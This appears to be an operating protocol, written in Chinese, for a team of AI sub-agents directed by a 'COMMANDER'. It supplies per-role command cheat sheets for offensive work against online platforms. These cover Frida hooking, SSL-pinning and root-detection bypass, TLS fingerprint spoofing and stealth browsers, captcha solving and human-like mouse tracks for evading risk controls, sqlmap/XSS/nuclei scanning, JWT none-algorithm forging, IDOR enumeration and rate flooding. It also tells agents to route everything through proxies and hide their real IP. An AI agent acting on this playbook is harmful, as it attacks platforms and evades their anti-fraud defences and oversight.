# ARC Team — 工具引导协议

> 本文件是每个sub-agent的工具能力基座。COMMANDER在spawn时将本内容+角色模板注入task prompt。

## ⚠️ 全局铁律

### 铁律1: 先侦察后攻击
- 每个目标先用被动方式收集信息（web_search/web_fetch/shodan）
- 确认攻击面后再使用主动工具（nmap/nuclei/ffuf）
- 未经COMMANDER授权不得对生产目标发起主动扫描

### 铁律2: 痕迹最小化
- 所有主动请求必须经过代理（proxychains/代理池）
- User-Agent/指纹随机化
- 日志/输出中不暴露真实IP

### 铁律3: 产出规范
- 分析报告 → `output/{序号}-{角色代号}-{任务类型}.md`
- 脚本/PoC → `output/scripts/{角色代号}/`
- 抓取的原始数据 → `output/raw/{平台}/{日期}/`

### 铁律4: 安全红线
- 不存储任何真实用户数据（密码/身份信息/支付信息）
- 不执行纵队C的实际攻击（撞库/越权遍历真实用户数据）
- 所有PoC仅用自己的测试账号验证

---

## Step 0: 武器自检（COMMANDER执行，结果注入sub-agent）

```bash
# 运行完整验证
bash ~/.openclaw/workspace/arc-team/scripts/verify-arsenal.sh

# 结果写入黑板
# → blackboard/TOOLKIT-STATUS.md
```

---

## 角色武器手册

### REVERSER — 逆向工程师

#### 动态Hook (最高优先级)
```bash
# Frida — 进程注入/函数Hook/内存读写
frida -U -f com.target.app -l hook_script.js     # USB连接设备注入
frida -H 192.168.1.100 -f com.target.app          # 远程设备注入
frida-ps -U                                        # 列出USB设备进程
frida-trace -U -i "sign*" com.target.app           # 追踪签名函数

# Python Frida脚本（更灵活）
python3 -c "
import frida
device = frida.get_usb_device()
session = device.attach('com.target.app')
script = session.create_script('''
Interceptor.attach(ptr('0x12345'), {
    onEnter(args) { console.log('arg0:', args[0].readUtf8String()); },
    onLeave(retval) { console.log('ret:', retval.readUtf8String()); }
});
''')
script.load()
"

# objection — 一键bypass SSL pinning / root检测
objection -g com.target.app explore
# 进入后: android sslpinning disable
# 进入后: android root disable
```

#### 静态分析
```bash
# jadx — APK反编译为Java
jadx -d output_dir target.apk
jadx --deobf target.apk                  # 带反混淆

# apktool — APK解包/smali
apktool d target.apk -o unpacked/
apktool b unpacked/ -o repacked.apk       # 重打包

# radare2 — 二进制分析
r2 -A target.so                           # 自动分析
# r2内: afl → 列出函数; pdf @func → 反汇编; axt @addr → 交叉引用

# Ghidra (headless) — 批量反编译
ghidra_headless /tmp/ghidra_project analysis -import target.so -scriptPath ./scripts -postScript ExportDecompiled.java
```

#### 小程序/JS逆向
```bash
# 微信小程序解包
unveilr /path/to/wxapkg_file

# JS AST反混淆（用Node脚本）
node -e "
const parser = require('@babel/parser');
const traverse = require('@babel/traverse').default;
const generator = require('@babel/generator').default;
const fs = require('fs');
const code = fs.readFileSync('obfuscated.js', 'utf8');
const ast = parser.parse(code);
// 自定义反混淆逻辑...
traverse(ast, { StringLiteral(path) { /* decode */ } });
console.log(generator(ast).code);
"
```

---

### PHANTOM — 指纹工程师

#### TLS指纹伪造 (核心武器)
```bash
# curl-impersonate — 模拟真实浏览器TLS指纹
curl_chrome116 https://target.com/api              # 模拟Chrome 116
curl_ff117 https://target.com/api                   # 模拟Firefox 117
curl_safari15_3 https://target.com/api              # 模拟Safari

# Python httpx + 自定义TLS
python3 -c "
import httpx
client = httpx.Client(http2=True, verify=False)
r = client.get('https://target.com/api', headers={
    'User-Agent': 'Mozilla/5.0 ...',
    'Accept-Language': 'zh-CN,zh;q=0.9',
})
print(r.status_code, r.text[:500])
"
```

#### 浏览器反检测
```bash
# Playwright stealth模式
python3 -c "
from playwright.sync_api import sync_playwright
with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)
    context = browser.new_context(
        user_agent='Mozilla/5.0 ...',
        viewport={'width': 1920, 'height': 1080},
        locale='zh-CN',
        timezone_id='Asia/Shanghai',
    )
    page = context.new_page()
    # 注入反检测脚本
    page.add_init_script('''
        Object.defineProperty(navigator, \"webdriver\", {get: () => undefined});
        // ... 更多指纹覆盖
    ''')
    page.goto('https://target.com')
    print(page.content()[:1000])
"

# undetected-chromedriver
python3 -c "
import undetected_chromedriver as uc
driver = uc.Chrome(headless=True)
driver.get('https://target.com')
print(driver.page_source[:1000])
driver.quit()
"

# puppeteer-extra-stealth (Node)
node -e "
const puppeteer = require('puppeteer-extra');
const stealth = require('puppeteer-extra-plugin-stealth');
puppeteer.use(stealth());
(async () => {
    const browser = await puppeteer.launch({headless: true});
    const page = await browser.newPage();
    await page.goto('https://bot.sannysoft.com');
    // 截图验证反检测效果
    await page.screenshot({path: 'stealth-test.png'});
    await browser.close();
})();
"
```

#### 流量拦截/分析
```bash
# mitmproxy — HTTPS中间人
mitmproxy -p 8080                             # 交互式代理
mitmdump -p 8080 -w traffic.flow              # 录制流量
mitmdump -p 8080 -s modify_script.py          # 脚本修改流量

# 代理链
proxychains4 curl https://target.com          # 通过代理链请求
```

#### 指纹检测验证
```bash
# 验证当前指纹是否被检测
curl_chrome116 https://tls.browserleaks.com/json | jq .
curl_chrome116 https://bot.sannysoft.com       # 检查反bot
```

---

### STRIKER — 协议攻击工程师

#### API探测与Fuzzing
```bash
# httpx — 批量探测存活+技术栈
echo "target.com" | httpx -tech-detect -status-code -title -follow-redirects

# ffuf — API端点爆破
ffuf -u https://target.com/api/FUZZ -w /path/to/wordlist.txt -mc 200,301,403 -t 50
ffuf -u https://target.com/api/v1/FUZZ -w api-endpoints.txt -H "Authorization: Bearer TOKEN"

# nuclei — 漏洞模板扫描
nuclei -u https://target.com -t exposures/ -t misconfiguration/ -t cves/
nuclei -u https://target.com -tags api,token -severity critical,high

# katana — 深度爬取发现隐藏API
katana -u https://target.com -d 3 -jc -kf -ef css,png,jpg
```

#### 协议级操作
```bash
# gRPC反射+调用
grpcurl -plaintext target.com:50051 list                    # 列出服务
grpcurl -plaintext target.com:50051 describe .ServiceName   # 描述方法
grpcurl -plaintext -d '{"id": 1}' target.com:50051 pkg.Service/Method

# WebSocket交互
websocat ws://target.com/ws
websocat -H "Authorization: Bearer TOKEN" wss://target.com/ws

# Protobuf解码（抓到的二进制数据）
protoc --decode_raw < captured_binary.bin
```

#### 并发/压测
```bash
# vegeta — HTTP压测
echo "GET https://target.com/api/product/1" | vegeta attack -rate=50/s -duration=10s | vegeta report
echo "POST https://target.com/api/order" | vegeta attack -rate=100/s -body=payload.json -header="Content-Type: application/json" | vegeta report

# wrk — 基准测试
wrk -t4 -c100 -d10s https://target.com/api/endpoint
wrk -t4 -c100 -d10s -s script.lua https://target.com/api/endpoint
```

---

### MIMIC — 风控逃逸工程师

#### 验证码破解
```bash
# ddddocr — 开箱即用（滑块/点选/OCR）
python3 -c "
import ddddocr
ocr = ddddocr.DdddOcr()
with open('captcha.png', 'rb') as f:
    result = ocr.classification(f.read())
print('识别结果:', result)
"

# ddddocr滑块识别
python3 -c "
import ddddocr
det = ddddocr.DdddOcr(det=True)  # 目标检测模式
slide = ddddocr.DdddOcr(det=False, ocr=False)
# 滑块缺口识别
with open('bg.png', 'rb') as f:
    bg = f.read()
with open('slide.png', 'rb') as f:
    target = f.read()
result = slide.slide_match(target, bg)
print('滑块位置:', result)
"

# YOLOv8点选验证码
python3 -c "
from ultralytics import YOLO
model = YOLO('yolov8n.pt')  # 或自训练模型
results = model('captcha_image.png')
for r in results:
    print(r.boxes.xyxy)  # 检测框坐标
"

# Tesseract OCR
tesseract captcha.png stdout -l chi_sim+eng     # 中英文OCR
```

#### 行为轨迹模拟
```python
# 贝塞尔曲线鼠标轨迹生成
python3 -c "
import numpy as np

def bezier_track(start, end, num_points=30):
    \"\"\"生成贝塞尔曲线轨迹，模拟人类鼠标移动\"\"\"
    # 随机控制点
    cp1 = (start[0] + np.random.uniform(0.2, 0.4) * (end[0]-start[0]),
           start[1] + np.random.uniform(-50, 50))
    cp2 = (start[0] + np.random.uniform(0.6, 0.8) * (end[0]-start[0]),
           start[1] + np.random.uniform(-30, 30))
    t = np.linspace(0, 1, num_points)
    # 三阶贝塞尔
    x = (1-t)**3*start[0] + 3*(1-t)**2*t*cp1[0] + 3*(1-t)*t**2*cp2[0] + t**3*end[0]
    y = (1-t)**3*start[1] + 3*(1-t)**2*t*cp1[1] + 3*(1-t)*t**2*cp2[1] + t**3*end[1]
    # 加入微抖动
    x += np.random.normal(0, 0.5, num_points)
    y += np.random.normal(0, 0.3, num_points)
    return list(zip(x.astype(int), y.astype(int)))

track = bezier_track((100, 300), (350, 300))
print('轨迹点数:', len(track))
print('前5个点:', track[:5])
"
```

#### 设备控制
```bash
# ADB批控
adb devices                                    # 列出设备
adb -s DEVICE_ID shell pm list packages        # 列出应用
adb -s DEVICE_ID shell input tap 500 800       # 模拟点击
adb -s DEVICE_ID shell input swipe 300 800 600 800 500  # 模拟滑动

# scrcpy — 屏幕镜像
scrcpy -s DEVICE_ID --max-size 1024 --bit-rate 2M
```

---

### HUNTER — 漏洞猎人

#### 信息收集
```bash
# nmap — 端口扫描+服务识别
nmap -sV -sC -T4 target.com                    # 标准扫描
nmap -sV --script=http-enum target.com          # HTTP枚举
nmap -p- --min-rate 5000 target.com             # 全端口快扫

# subfinder — 子域名
subfinder -d target.com -o subdomains.txt
cat subdomains.txt | httpx -status-code -title  # 存活验证

# katana — JS中的API端点发现
katana -u https://target.com -jc -d 3 -f qurl | sort -u > endpoints.txt
```

#### 漏洞扫描
```bash
# nuclei — 全面扫描
nuclei -u https://target.com -severity critical,high -t cves/ -t exposures/ -t vulnerabilities/
nuclei -l urls.txt -tags api -severity medium,high,critical

# sqlmap — SQL注入
sqlmap -u "https://target.com/api?id=1" --batch --level=3 --risk=2
sqlmap -r request.txt --batch --dbs              # 从抓包文件

# dalfox — XSS
dalfox url "https://target.com/search?q=test" --blind https://your-callback.com

# feroxbuster — 目录发现
feroxbuster -u https://target.com -w /path/to/wordlist -x php,json,js -t 50
```

#### API安全测试
```bash
# JWT分析
python3 -c "
import jwt  # PyJWT
token = 'eyJ...'
# 解码（不验证签名）
decoded = jwt.decode(token, options={'verify_signature': False})
print('Payload:', decoded)
# 检查是否使用None算法
try:
    forged = jwt.encode(decoded, '', algorithm='none')
    print('⚠️ None算法可用:', forged)
except: print('✅ None算法已禁用')
"

# BOLA/IDOR手动测试模板
python3 -c "
import requests
base = 'https://target.com/api/v1/orders'
headers = {'Authorization': 'Bearer USER_A_TOKEN'}
# 遍历订单ID测试越权
for order_id in range(1000, 1010):
    r = requests.get(f'{base}/{order_id}', headers=headers)
    if r.status_code == 200:
        print(f'⚠️ IDOR: order {order_id} accessible - {r.text[:100]}')
    else:
        print(f'✅ order {order_id} -> {r.status_code}')
"
```

---

### SHIELD — 防御分析师

#### 防御面探测
```bash
# WAF识别
wafw00f https://target.com
wafw00f -l                                      # 列出可识别的WAF

# 技术栈识别
whatweb https://target.com -v

# TLS/SSL审计
testssl --html https://target.com               # 完整TLS报告
sslscan target.com                              # 快速SSL扫描

# tshark流量分析
tshark -i en0 -f "host target.com" -w capture.pcap    # 抓包
tshark -r capture.pcap -T fields -e tls.handshake.ja3  # 提取JA3
```

#### Shodan情报
```bash
# Shodan — 互联网暴露面
shodan host 1.2.3.4                             # IP详情
shodan search "hostname:target.com"              # 搜索目标
shodan stats --facets port "org:Target Corp"     # 端口统计
```

---

## ⛔ 禁止事项

- **禁止调用 sessions_spawn / subagents** — sub-agent不能再spawn子agent
- **禁止存储真实用户数据** — 密码/身份信息/支付信息
- **禁止对未授权目标发起主动扫描** — 需COMMANDER明确授权
- **禁止修改非arc-team目录的文件** — 除跨团队接口外
- **禁止在明文中记录代理池凭证/账号池数据**

---

## 搜索策略

### 逆向情报收集
```
1. web_search "平台名 + 逆向 / reverse / sign算法 / anti-bot"
2. web_search "平台名 + frida hook / xposed / 签名分析" (中文社区)
3. web_search "site:github.com 平台名 + sign / encrypt / api"
4. web_fetch 技术博客/GitHub README
5. 汇总已有公开成果 → 判断可复用性
```

### 防御体系识别
```
1. web_search "平台名 + WAF / CDN / anti-scraping / bot detection"
2. wafw00f + whatweb 主动探测
3. shodan 搜索暴露面
4. 综合评定防御等级 L1-L5
```

## 工作目录
`~/.openclaw/workspace/arc-team/`
